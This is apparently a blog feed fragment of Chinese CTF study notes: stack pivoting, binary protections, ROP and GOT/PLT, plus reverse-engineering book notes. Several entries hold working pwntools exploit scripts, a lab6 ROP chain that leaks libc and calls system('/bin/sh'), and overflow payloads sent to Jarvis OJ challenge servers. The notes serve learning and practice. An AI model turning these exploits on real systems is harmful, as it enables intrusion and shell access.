        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><ul><li>如果覆盖长度正好只能覆盖到ret的地址，如何ROP？</li><li>需要用到栈迁移/栈劫持技术</li><li>栈迁移的实现：通过将ebp覆盖成我们构造好的fake_ebp，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上</li></ul><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h3><ul><li>用来存放程序中未初始化的或初始值为0的全局变量和静态变量的一块内存区域</li><li>可读写</li><li>在程序执行之前BSS段会自动清零</li><li>__bss_start表示BSS的开始地址</li></ul><p><strong>BSS段与DATA段</strong></p><ul><li>BSS段存放未初始化或初始值为0的全局变量</li><li>DATA段存放已初始化的全局变量</li></ul><pre class="line-numbers language-cC"><code class="language-cC">int a[3000];                //存在BSS段中int b[3000]={1,2,3,4,5,6};    //存在DATA段中int main(){    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>BSS不占用.exe文件的空间，其内容由操作系统初始化</li><li>DATA要占用.exe文件的空间，其内容由程序初始化</li></ul><p>参考网页：</p><p><a href="https://blog.csdn.net/qq_34888036/article/details/80870814" target="_blank" rel="noopener">https://blog.csdn.net/qq_34888036/article/details/80870814</a></p><h3 id="HITCON-Training-lab6"><a href="#HITCON-Training-lab6" class="headerlink" title="HITCON-Training lab6"></a>HITCON-Training lab6</h3><p><strong>溢出位数不够，需要使用栈迁移</strong></p><p>writeup：</p><p><a href="https://blog.csdn.net/zszcr/article/details/79841848（有图，但是反而不太好理解）" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79841848（有图，但是反而不太好理解）</a></p><p><a href="https://www.cnblogs.com/yof3ng/p/9852958.html" target="_blank" rel="noopener">https://www.cnblogs.com/yof3ng/p/9852958.html</a></p><p>首先看懂exp:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebx_ret</span>buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span><span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libcsystem_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offsetbinsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset<span class="token triple-quoted-string string">'''payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)p.send(payload)sleep(0.1)#p.send("/bin/sh\0")p.interactive()'''</span><span class="token comment" spellcheck="true">#懵逼栈</span>payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看懂exp的重点在于弄清楚每一个时刻ebp和esp指向的位置</p><p>第一段payload：</p><ul><li>覆盖0x28位的buf</li><li>ebp指向buf1(bss+0x500)</li><li>调用read读取下一段payload，读取到buf1处</li><li>用leave_ret将ebp的值mov给esp，并将buf1处的第一个值pop给ebp</li></ul><p>第二段payload：</p><ul><li>ebp指向buf2(bss+0x400)</li><li>调用puts输出puts的libc地址</li><li><strong><em>遇到一个问题：为什么要先pop ebx再retn而不是直接retn？这样后面的read函数不就没法调用了吗？</em></strong></li><li><strong>问题已解决：32位程序中调用完函数后需要先将参数从栈中pop掉才能读取后面的数据，正常的程序在调用完函数之后会直接改写esp的值</strong></li><li>调用read读取下一段payload，读取到buf2处</li><li>用leave_ret将ebp的值mov给esp，并将buf2处的第一个值pop给ebp</li></ul><p>第三段payload：</p><ul><li>ebp指向buf1</li><li>调用system函数，传入”/bin/sh”作为参数</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆向工程核心原理》读书笔记</title>
      <link href="/2020/01/02/ni-xiang-gong-cheng-he-xin-yuan-li-du-shu-bi-ji/"/>
      <url>/2020/01/02/ni-xiang-gong-cheng-he-xin-yuan-li-du-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="《逆向工程核心原理》"><a href="#《逆向工程核心原理》" class="headerlink" title="《逆向工程核心原理》"></a>《逆向工程核心原理》</h1><h3 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h3><p>没什么营养</p><h3 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h3><p><strong>EP(EntryPoint)</strong> 入口点，执行应用程序时最先执行的代码的起始位置</p><table><thead><tr><th>指令</th><th>快捷键</th><th align="left">含义</th></tr></thead><tbody><tr><td>Restart</td><td>Ctrl+F2</td><td align="left">重新开始调试</td></tr><tr><td>Step Into</td><td>F7</td><td align="left">执行一句OP code（操作码），若遇到调用命令（CALL），将进入函数代码内部</td></tr><tr><td>Step Over</td><td>F8</td><td align="left">遇到CALL仅执行函数本身，不跟随进入</td></tr><tr><td>Execute till Return</td><td>Ctrl+F9</td><td align="left">一直在函数内部运行，直到遇到RETN命令，跳出函数</td></tr><tr><td>Go to</td><td>Ctrl+G</td><td align="left">移动到指定地址，用来查看代码或内存，运行时不可用</td></tr><tr><td>Execute till Cursor</td><td>F4</td><td align="left">执行到光标位置，即直接转到要调试的地址</td></tr><tr><td>Set/Reset BreakPoint</td><td>F2</td><td align="left">设置或取消断点（BP）</td></tr><tr><td>Run</td><td>F9</td><td align="left">运行（若有断点，则执行至断点处）</td></tr><tr><td>Show the current EIP</td><td>*</td><td align="left">显示当前EIP（命令指针）位置</td></tr><tr><td>Show the previous Cursor</td><td>-</td><td align="left">显示上一个光标的位置</td></tr><tr><td>Preview CALL/JMP address</td><td>Enter</td><td align="left">若光标处有CALL/JMP等指令，则跟踪并显示相关地址（运行时不可用，简单查看函数内容时非常有用）</td></tr></tbody></table><h4 id="2-3-3-设置“大本营”的四种方法"><a href="#2-3-3-设置“大本营”的四种方法" class="headerlink" title="2.3.3 设置“大本营”的四种方法"></a>2.3.3 设置“大本营”的四种方法</h4><ol><li>Goto命令</li><li>设置断点</li><li>注释</li><li>标签</li></ol><h4 id="2-4-快速查找指定代码的四种方法"><a href="#2-4-快速查找指定代码的四种方法" class="headerlink" title="2.4 快速查找指定代码的四种方法"></a>2.4 快速查找指定代码的四种方法</h4>]]></content>
      
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 《逆向工程核心原理》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门——栈</title>
      <link href="/2019/12/31/pwn-ru-men-zhan/"/>
      <url>/2019/12/31/pwn-ru-men-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="几个特殊寄存器"><a href="#几个特殊寄存器" class="headerlink" title="几个特殊寄存器"></a>几个特殊寄存器</h3><p><strong>RIP</strong></p><ul><li>指向当前正在执行的指令</li><li>不可以直接修改</li></ul><p><strong>RSP</strong></p><ul><li>指向当前的栈顶</li><li>Push/pop会对其对应位置数据进行操作，同时改变RSP的值</li></ul><p><strong>RBP</strong></p><ul><li>指向当前栈的栈底</li><li>常用间接取操作数的方式来对临时变量进行读写</li></ul><h3 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h3><p>内核为每个运行的进程虚拟创建的布局</p><p>32位：0x8048000</p><p>64位：0x400000</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><ul><li>堆：由<strong>低</strong>地址向<strong>高</strong>地址扩展</li><li>栈：由<strong>高</strong>地址向<strong>低</strong>地址扩展</li></ul><p><img src="%E5%A0%86%E5%92%8C%E6%A0%88.png" alt="堆和栈"></p><h3 id="临时变量"><a href="#临时变量" class="headerlink" title="临时变量"></a>临时变量</h3><ul><li>临时变量只记录在<strong>当前</strong>函数所在的栈空间中</li><li>一般情况下，<strong>先</strong>声明的临时变量处于更<strong>高</strong>的地址（栈底）</li></ul><p><img src="%E4%B8%B4%E6%97%B6%E5%8F%98%E9%87%8F.png" alt="临时变量"></p><p><strong>低地址向高地址覆盖，即后声明的变量可以覆盖到先声明的变量</strong></p><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><ul><li>最终目的是构造出可以执行system(“/bin/sh”)这类可以getshell的命令运行</li><li>关注点肯定是能通过输入控制的地方</li><li>对长度控制这类的数据一定要仔细观察</li><li>要把握整个程序的流程，即程序每一个函数到底在干什么</li></ul><h5 id="标准模板"><a href="#标准模板" class="headerlink" title="标准模板"></a>标准模板</h5><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span>“程序名”<span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span>“地址”<span class="token punctuation">,</span>端口<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#本地用第一行，远程用第二行</span>……p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="标准IO处理函数"><a href="#标准IO处理函数" class="headerlink" title="标准IO处理函数"></a>标准IO处理函数</h5><pre class="line-numbers language-python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>read函数不读取到回车符\n也可以结束，gets不行</li><li>sendline()相当于send()后再加一个回车符\n</li></ul><h3 id="栈帧——函数调用及退出的一种规则"><a href="#栈帧——函数调用及退出的一种规则" class="headerlink" title="栈帧——函数调用及退出的一种规则"></a>栈帧——函数调用及退出的一种规则</h3><ul><li>重点关注<strong>push,pop,call,leave,ret</strong>这些指令</li><li>call一个函数：将<strong>RIP</strong>调整至这里，并开辟新的栈空间</li><li>保存现场：保存<strong>RIP,RSP,RBP</strong></li><li>恢复现场：恢复<strong>RIP,RSP,RBP</strong></li></ul><pre class="line-numbers language-assembly"><code class="language-assembly">push    rbp                ;将rbp存入栈中mov        rbp,rsp            ;将旧的栈顶作为新的栈底sub        rsp,20h            ;将旧的栈顶减20h作为新的栈顶...leave                    ;mov    rsp,rbp 将旧的栈底作为新的栈顶，即恢复rsp                        ;pop    rbp 恢复rbpretn                    ;pop    rip (并不存在，帮助理解而已)恢复rip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><ul><li>程序没有正确的检测输入数据的长度，攻击者输入比程序员设定的buffer大小更多的数据，使得超出的部分覆盖到程序里其他的变量或者重要数据，影响到程序本身的执行</li><li>可直接覆盖到返回地址并控制栈上的参数</li></ul><h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><pre class="line-numbers language-c"><code class="language-c">ssize_t <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[rsp+0h][rbp-20h]</span>    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>buf长度为0x20，但是读取了长度为0x100的数据</strong></p><p><img src="%E8%A6%86%E7%9B%96.png" alt="覆盖"></p><p><strong>注意，这张图中的高低地址和前面的图中的相反</strong></p><ul><li>填满<strong>buf</strong>，覆盖<strong>rbp</strong>为任意值，覆盖<strong>rip</strong>为需要跳转到的地址</li><li><strong>p64()</strong>可将小端序数字转换为八字节的字符串，反操作为<strong>u64()</strong></li><li>四字节的是<strong>p32(),u32()</strong></li></ul><h3 id="安全保护机制"><a href="#安全保护机制" class="headerlink" title="安全保护机制"></a>安全保护机制</h3><p><strong><code>checksec 文件名</code>查看保护机制</strong></p><p><strong>canary</strong></p><ul><li>编译阶段的安全机制</li><li>进入函数保存<strong>rbp</strong>之后，向栈中插入一段值，就叫<strong>canary</strong></li><li>退出时，<strong>leave</strong>之前会判断<strong>canary</strong>是否被改变</li><li>如果发现<strong>canary</strong>改变，则程序报错并结束</li><li>有效防止返回地址被直接覆盖</li></ul><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[rsp+0h][rbp-30h]</span>    <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[rsp+28h][rbp-8h]</span>    v2<span class="token operator">=</span><span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token operator">^</span>v2<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>NX(No eXute)</strong></p><ul><li>编译阶段的安全机制</li><li>默认开启</li><li>如果未开启，可能会导致<strong>stack</strong>以及<strong>heap</strong>拥有执行的权限</li><li>也就是说如果可以劫持指针到<strong>rsp</strong>，可以造成数据被当成代码执行的可能</li></ul><p><strong>ASLR(Address Space Layout Randomization)</strong></p><ul><li>运行时的安全机制</li><li>提高了漏洞利用难度</li><li><strong>libc、栈、堆</strong>的加载位置被随机化，但是主镜像不会</li></ul><p><strong>PIE(Position Independent Executables)</strong></p><ul><li>提高了ROP难度</li><li>让<strong>ELF</strong>加载的基地址变得随机</li><li>一般来说默认不开启</li><li>开启<strong>ASLR</strong>之后<strong>PIE</strong>才会生效</li><li><strong>ASLR</strong>不负责代码段及数据段的随机化工作，这项工作由<strong>PIE</strong>负责</li></ul><p><strong>RELRO(Relocation Read Only)</strong></p><ul><li>减少了对<strong>GOT</strong>的攻击</li><li><strong>GOT</strong>部分在程序加载时就解析并绑定所有的动态符号</li><li>之后<strong>GOT</strong>段变为只读权限</li><li>一般来说，题目检测为<strong>Partial RELRO</strong>对利用来说就等于没开，<strong>Full RELRO</strong>则视为开启</li></ul><h3 id="ROP-return-oriented-programming"><a href="#ROP-return-oriented-programming" class="headerlink" title="ROP(return oriented programming)"></a>ROP(return oriented programming)</h3><ul><li>在栈缓冲区溢出的基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或变量的值，从而控制程序的执行流程</li><li>所谓gadgets就是以ret结尾的指令序列</li><li>寻找需要的gadgets: <code>ROPgadget --binary ./文件名 --only &quot;pop|ret&quot;</code></li></ul><h3 id="延迟绑定-lazy-bind"><a href="#延迟绑定-lazy-bind" class="headerlink" title="延迟绑定 lazy bind"></a>延迟绑定 lazy bind</h3><ul><li>程序调用的库函数如<strong>printf,puts,scanf…</strong>来自于共享库即<strong>libc.so</strong>文件</li><li>程序肯定运行在虚拟内存时，<strong>libc</strong>也被动态加载进来，所以叫动态链接文件</li><li>程序有一种机制，提供了某些接口，可以调用到<strong>libc</strong>里面的函数</li><li>两个重要的结构 <strong>GOT</strong>(global offset table)和PLT(procedure linkage table)</li><li><strong>GOT</strong>是一个函数指针表，存着已调用过的libc的函数地址</li><li><strong>PLT</strong>里存储的是指令，决定了跳到<strong>GOT</strong>的哪个索引</li><li>初次调用库函数时，会通过复杂的操作在对应<strong>GOT</strong>的位置写入函数指针的值</li></ul><p>该博客有较为详细的讲解：</p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748</a></p><p><strong>PLT</strong>表中的数据是<strong>GOT</strong>表的地址，可以画出下图：</p><p><img src="PLT%E4%B8%8EGOT(1).png" alt="PLT与GOT(1)"></p><p>但是事实上，<strong>plt[0]</strong>并没有对应<strong>got</strong>中的地址，而且<strong>plt[1]</strong>对应的并不是<strong>got[1]</strong>而是<strong>got[3]</strong>，如下图：</p><p><img src="PLT%E4%B8%8EGOT(2).png" alt="PLT与GOT(2)"></p><p>调用一个未调用过的函数的过程如下（以<strong>PLT[1]</strong>为例）：</p><ol><li>跳转到<strong>PLT[1]</strong>中存储的地址（指向<strong>GOT[3]</strong>）</li><li>跳转到<strong>GOT[3]</strong>中存储的地址（指向下一条指令的地址）</li><li>将<strong>0x3</strong>压栈（<strong>GOT</strong>中的下标）</li><li>跳转到<strong>PLT[0]</strong></li><li>执行一个函数将真正的函数地址覆盖到<strong>GOT[3]</strong>中</li></ol><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><strong>libc</strong>地址：</p><ul><li>32位：F7开头</li><li>64位：7F开头</li></ul><p>参数传递：</p><ul><li>32位：通过栈</li><li>64位：通过寄存器，一般记住前三个：<strong>rdi,rsi,rdx</strong></li></ul><p>构造payload：</p><p><img src="%E6%9E%84%E9%80%A0payload.png" alt="构造payload"></p><p>有<strong>system</strong>函数以及<strong>“/bin/sh”</strong>字符串，但不在一起使用的情况：</p><ul><li>分32位和64位两种情况，根据上述方法构造payload</li></ul><p>既没有<strong>system</strong>函数也没有<strong>“/bin/sh”</strong>字符串的情况：</p><ul><li>泄露出libc</li><li>跳回到漏洞函数再次执行</li><li>构造<strong>system(“/bin/sh”)</strong>来getshell</li><li>如果未提供libc，还需要找到对应版本的libc</li></ul><p>（查找libc的网站： <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me</a>  ）</p><h3 id="PWN题的一般步骤"><a href="#PWN题的一般步骤" class="headerlink" title="PWN题的一般步骤"></a>PWN题的一般步骤</h3><ol><li>Checksec查看基本信息</li><li>丢到对应架构的IDA中分析</li><li>定位漏洞</li><li>初步编写exp</li><li>本地调试</li><li>修改exp</li><li>远程环境匹配</li><li>远程利用</li></ol><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p><h3 id="1118-T1-level0"><a href="#1118-T1-level0" class="headerlink" title="1118 T1(level0)"></a>1118 T1(level0)</h3><ul><li>存在一个<strong>callsystem</strong>函数，内容为<strong>system(“/bin/sh”)</strong>，所以只需要跳转到<strong>callsystem</strong>函数即可</li><li>在<strong>vulnerable_function</strong>函数中，buf长度为0x80，但read读取的长度为0x200</li><li>构造payload：<strong>0x80位覆盖buf+0x8位覆盖rbp+callsystem函数的地址</strong></li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#p=process("level0")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span> <span class="token number">9881</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40059a</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"World\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1118-T2-tell"><a href="#1118-T2-tell" class="headerlink" title="1118 T2(tell)"></a>1118 T2(tell)</h3><ul><li>虽然没有<strong>system(“/bin/sh”)</strong>,但存在一个<strong>good_game</strong>函数，内容为读取<strong>flag.txt</strong>文件，并将其内容输出</li><li>在<strong>main</strong>函数中v4长度为0x88，但读取长度为0x100</li><li>构造payload：<strong>0x88位的v4+good_game函数的地址</strong></li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level="debug"</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn.jarvisoj.com"</span><span class="token punctuation">,</span><span class="token number">9876</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400620</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>T1需要填充<strong>rbp</strong>但是T2不需要，原因在于T2的<strong>main</strong>函数<strong>retn</strong>之前没有<strong>leave</strong>，也就是说没有<strong>pop rbp</strong>，所以不需要将<strong>rbp</strong>的地方覆盖</p><h3 id="1118-T3-level2"><a href="#1118-T3-level2" class="headerlink" title="1118 T3(level2)"></a>1118 